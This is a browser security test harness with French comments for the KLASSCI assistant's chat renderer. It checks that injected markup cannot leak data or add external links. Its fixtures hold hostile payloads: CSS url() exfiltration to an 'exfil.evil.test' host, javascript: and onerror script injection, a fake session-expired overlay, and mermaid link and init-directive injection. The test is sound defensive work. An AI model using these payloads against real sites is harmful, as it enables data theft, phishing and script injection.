/*
 * Harnais navigateur : sécurité du rendu de l'assistant KLASSCI.
 *
 * Charge les VRAIS scripts public/js/assistant/*.js dans Chromium, fait passer
 * des charges malveillantes par les deux chemins du texte (diffusion au fil de
 * l'eau et relecture d'historique), par un widget tableau et par des blocs
 * mermaid, puis vérifie :
 *   1. aucune requête vers un hôte tiers (style url(), CSS de diagramme, image) ;
 *   2. aucun lien cliquable hors de /esbtp, /dashboard, /chatbot, ni dans le
 *      texte ni dans un SVG ;
 *   3. window.__pwn reste vide (onerror, javascript:) ;
 *   4. aucun élément du texte ne garde style, id ni classe étrangère ;
 *   5. un diagramme invalide ne laisse aucun nœud d'erreur sous <body>.
 *
 * Lancement (voir tests/js/README.md) :
 *   node tests/js/assistant-securite.spec.mjs
 * Variables : PLAYWRIGHT_PATH (dossier node_modules contenant playwright),
 * CHROMIUM_PATH (exécutable), ASSISTANT_CDN_DIRECT=1 (laisser Chromium joindre
 * le CDN au lieu de passer par curl), CAPTURE=chemin.png.
 * Code de sortie : 0 si tout passe, 1 sinon.
 */
import { createRequire } from 'node:module';
import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const ICI = path.dirname(fileURLToPath(import.meta.url));
const RACINE = path.resolve(ICI, '..', '..');
const SCRIPTS = ['noyau', 'markdown', 'rendus', 'vue', 'composant'];
const ORIGINE = 'http://klassci.test';
const CDN = /^https:\/\/(cdn\.jsdelivr\.net|cdnjs\.cloudflare\.com)\//;
const LIEN_INTERNE = /^\/(esbtp|dashboard|chatbot)([/?#][A-Za-z0-9/_\-?=&%.#]*)?$/;

async function chargerPlaywright() {
    try {
        return await import('playwright');
    } catch (e) {
        const base = process.env.PLAYWRIGHT_PATH || '/opt/node22/lib/node_modules/';
        return createRequire(path.join(base, 'x.js'))('playwright');
    }
}

function executableChromium() {
    if (process.env.CHROMIUM_PATH) { return process.env.CHROMIUM_PATH; }
    const connu = '/opt/pw-browsers/chromium-1194/chrome-linux/chrome';
    return fs.existsSync(connu) ? connu : undefined;
}

const CACHE = path.join(os.tmpdir(), 'klassci-assistant-cdn');
function depuisCdn(url) {
    fs.mkdirSync(CACHE, { recursive: true });
    const f = path.join(CACHE, url.replace(/[^a-z0-9.]+/gi, '_').slice(-180));
    if (!fs.existsSync(f)) { execFileSync('curl', ['-sS', '-L', '--fail', '-o', f, url]); }
    return fs.readFileSync(f);
}

function typeDe(url) {
    if (/\.css(\?|$)/.test(url)) { return 'text/css'; }
    if (/\.woff2?(\?|$)/.test(url)) { return 'font/woff2'; }
    return 'application/javascript';
}

const PAGE = `<!doctype html><html lang="fr"><head><meta charset="utf-8">
<link rel="stylesheet" href="/css/assistant.css">
</head><body><p>Page hôte</p>
<div class="ast-panel is-open"><div class="ast-thread"><div class="ast-thread-inner"><div id="hote" class="ast-answer"></div></div></div></div>
${SCRIPTS.map((n) => `<script src="/js/assistant/${n}.js"></script>`).join('\n')}
</body></html>`;

const TEXTE_PIEGE = [
    'Exfiltration : <span style="background:url(https://exfil.evil.test/?d=secret)">x</span>',
    '',
    '<a href="/esbtp/connexion" style="position:fixed;inset:0;z-index:99999;background:#fff">SESSION EXPIRÉE, reconnectez-vous</a>',
    '',
    'Liens : [externe](https://evil.test/a) [anti](/\\evil.test) [js](javascript:window.__pwn=1) [tab](/esb\ttp/x) [interne](/esbtp/etudiants/12)',
    'Brut : https://auto.evil.test/z <img src="https://img.evil.test/x.png" onerror="window.__pwn=1">',
    '<div id="spoof" class="ast-panel" data-x="1">usurpation</div>',
    '<svg><a href="https://svg.evil.test"><text>svg</text></a></svg>',
    '',
    '```mermaid',
    'sequenceDiagram',
    '  participant A',
    '  link A: Evil @ https://link.evil.test/x',
    '  links A: {"Doc": "https://links.evil.test/y"}',
    '  A->>A: bonjour',
    '```',
    '',
    '```mermaid',
    '%%{init: {"securityLevel": "loose", "themeCSS": "g{background:url(https://theme.evil.test/)}"}}%%',
    'flowchart LR',
    '  A[Début] --> B[Fin]; click A "https://click.evil.test" "piège"; click B callback',
    // La grammaire de mermaid refuse url() dans classDef : la CSS injectée n'arrive
    // que par la directive %%{init}%% ci-dessus, retirée avant rendu.
    '  classDef c fill:#e8f0fd,stroke:#0453cb',
    '  class A c',
    '```',
    '',
    '```mermaid',
    'flowchart LR',
    '  A -->> ((( ]]] invalide',
    '```',
    ''
].join('\n');

const TABLEAU = {
    kind: 'tableau',
    titre: 'Piège',
    colonnes: [{ cle: 'n', libelle: 'Nom', type: 'lien' }],
    lignes: [
        { n: { url: 'https://evil.test/cellule', texte: 'Cellule externe' } },
        { n: { url: '/\\evil.test', texte: 'Cellule anti' } },
        { n: { url: 'javascript:window.__pwn=1', texte: 'Cellule js' } },
        { n: { url: '/esbtp/etudiants/3', texte: 'Cellule interne' } }
    ],
    lien: { url: 'javascript:window.__pwn=1', libelle: 'Pied piégé' }
};

const { chromium } = await chargerPlaywright();
const browser = await chromium.launch({ executablePath: executableChromium() });
const page = await (await browser.newContext({ viewport: { width: 1440, height: 900 } })).newPage();
const tiers = [];
const erreurs = [];
page.on('pageerror', (e) => erreurs.push(e.message));

await page.route('**/*', async (route) => {
    const url = route.request().url();
    if (url.startsWith(ORIGINE)) {
        const chemin = new URL(url).pathname;
        if (chemin === '/') { return route.fulfill({ status: 200, contentType: 'text/html; charset=utf-8', body: PAGE }); }
        const fichier = path.join(RACINE, 'public', chemin);
        if (fichier.startsWith(path.join(RACINE, 'public')) && fs.existsSync(fichier)) {
            return route.fulfill({ status: 200, contentType: typeDe(chemin), body: fs.readFileSync(fichier) });
        }
        return route.fulfill({ status: 404, body: '' });
    }
    if (CDN.test(url)) {
        if (process.env.ASSISTANT_CDN_DIRECT === '1') { return route.continue(); }
        try {
            return route.fulfill({ status: 200, body: depuisCdn(url), headers: { 'content-type': typeDe(url), 'access-control-allow-origin': '*' } });
        } catch (e) {
            return route.fulfill({ status: 502, body: '' });
        }
    }
    if (!url.startsWith('data:') && !url.startsWith('blob:')) { tiers.push(url); }
    return route.abort();
});

await page.goto(ORIGINE + '/');
await page.waitForFunction(() => window.KlassciAst && window.KlassciAst.Vue && typeof window.klassciAssistant === 'function');

// Deux réponses : l'une diffusée par morceaux, l'autre relue depuis l'historique.
await page.evaluate(async ({ texte, tableau }) => {
    const A = window.KlassciAst;
    const ctx = { posterFormulaire: () => Promise.resolve({ ok: false }), deciderAction: () => Promise.resolve({ ok: false }) };
    const nouveauMsg = (key) => ({ key, role: 'assistant', status: 'streaming', liens: [], suites: { questions: [], actions: [] } });
    await A.chargerLibs();
    const hote = document.getElementById('hote');

    const diffusee = new A.Vue(nouveauMsg('diffusee'), ctx);
    diffusee.monter(hote);
    diffusee.widget('a00000001', 'tableau', tableau);
    diffusee.texteDebut('t1');
    for (let i = 0; i < texte.length; i += 40) {
        diffusee.texteDelta('t1', texte.slice(i, i + 40));
        await new Promise((r) => setTimeout(r, 5));
    }
    diffusee.texteFin('t1');
    diffusee.terminer(false);

    const relue = new A.Vue(nouveauMsg('relue'), ctx);
    relue.monter(hote);
    relue.chargerParties([
        { type: 'widget', id: 'a00000002', kind: 'tableau', data: tableau },
        { type: 'texte', texte: texte },
        { type: 'lien', url: 'https://evil.test/lien' }
    ]);
}, { texte: TEXTE_PIEGE, tableau: TABLEAU });

// Les diagrammes se dessinent de façon asynchrone.
await page.waitForFunction(() => {
    const blocs = document.querySelectorAll('.ast-mmd');
    return blocs.length >= 6 && !document.querySelector('.ast-mmd-attente');
}, null, { timeout: 30000 }).catch(() => erreurs.push('diagrammes non dessinés à temps'));
await page.waitForTimeout(800);

const constat = await page.evaluate((motif) => {
    const interne = new RegExp(motif);
    const hote = document.getElementById('hote');
    const liens = Array.from(hote.querySelectorAll('a')).map((a) => ({
        href: a.getAttribute('href'),
        xlink: a.getAttribute('xlink:href'),
        svg: a.namespaceURI === 'http://www.w3.org/2000/svg',
        texte: a.textContent.trim().slice(0, 40)
    }));
    // Ce que le texte du modèle a produit : les descendants de .ast-md, hors des
    // enveloppes que le client pose lui-même (code, diagramme, tableau défilant).
    const texte = Array.from(hote.querySelectorAll('.ast-md *')).filter((n) => !n.closest('.ast-code, .ast-mmd') && !n.classList.contains('ast-md-table'));
    const attributsInterdits = texte.filter((n) => n.hasAttribute('style') || n.hasAttribute('id')
        || Array.from(n.attributes).some((a) => a.name.startsWith('data-'))
        || (n.hasAttribute('class') && n.getAttribute('class').split(/\s+/).some((c) => c && !/^language-[\w-]+$/.test(c))));
    const fixes = Array.from(hote.querySelectorAll('*')).filter((n) => getComputedStyle(n).position === 'fixed');
    const restesBody = Array.from(document.body.children).filter((n) => /^d?ast-mmd-/.test(n.id || '') || /Syntax error/i.test(n.textContent || ''));
    const cssDiagrammes = Array.from(hote.querySelectorAll('.ast-mmd style')).map((s) => s.textContent).join('\n');
    return {
        liens,
        liensExternes: liens.filter((l) => l.xlink || (l.href !== null && !interne.test(l.href)) || l.svg),
        attributsInterdits: attributsInterdits.map((n) => n.outerHTML.slice(0, 120)),
        positionFixe: fixes.map((n) => n.outerHTML.slice(0, 120)),
        pwn: window.__pwn === undefined ? null : window.__pwn,
        restesBody: restesBody.map((n) => (n.id || n.tagName) + ' ' + (n.textContent || '').slice(0, 60)),
        cssAvecUrl: /url\s*\(|@import/i.test(cssDiagrammes),
        diagrammes: hote.querySelectorAll('.ast-mmd svg').length,
        diagrammesEnCode: hote.querySelectorAll('.ast-mmd-note').length,
        svgAvecLien: hote.querySelectorAll('.ast-mmd svg a, .ast-mmd svg [href], .ast-mmd svg foreignObject').length,
        texteUsurpation: /SESSION EXPIRÉE/.test(hote.textContent)
    };
}, LIEN_INTERNE.source);

if (process.env.CAPTURE) { await page.screenshot({ path: process.env.CAPTURE, fullPage: true }); }
await browser.close();

const verifications = [
    ['aucune requête vers un tiers', tiers.length === 0, tiers],
    ['aucun lien hors application (texte, tableau, SVG)', constat.liensExternes.length === 0, constat.liensExternes],
    ['window.__pwn vide', constat.pwn === null, constat.pwn],
    ['aucun style, id, data-* ni classe étrangère dans le texte', constat.attributsInterdits.length === 0, constat.attributsInterdits],
    ['aucun élément en position fixe dans la réponse', constat.positionFixe.length === 0, constat.positionFixe],
    ['aucun reste de mermaid sous <body>', constat.restesBody.length === 0, constat.restesBody],
    ['CSS des diagrammes sans url() ni @import', !constat.cssAvecUrl, constat.cssAvecUrl],
    ['aucun lien ni foreignObject dans un SVG', constat.svgAvecLien === 0, constat.svgAvecLien],
    ['les diagrammes valides sont dessinés (2 par réponse)', constat.diagrammes === 4, constat.diagrammes],
    ['le diagramme invalide retombe sur son code (1 par réponse)', constat.diagrammesEnCode === 2, constat.diagrammesEnCode],
    ['aucune erreur de page', erreurs.length === 0, erreurs]
];

let echecs = 0;
for (const [nom, ok, detail] of verifications) {
    console.log((ok ? 'OK    ' : 'ÉCHEC ') + nom + (ok ? '' : ' → ' + JSON.stringify(detail)));
    if (!ok) { echecs += 1; }
}
console.log('Liens restés cliquables : ' + constat.liens.filter((l) => l.href).map((l) => l.href).join(', '));
console.log(echecs ? echecs + ' vérification(s) en échec' : 'Toutes les vérifications passent');
process.exit(echecs ? 1 : 0);
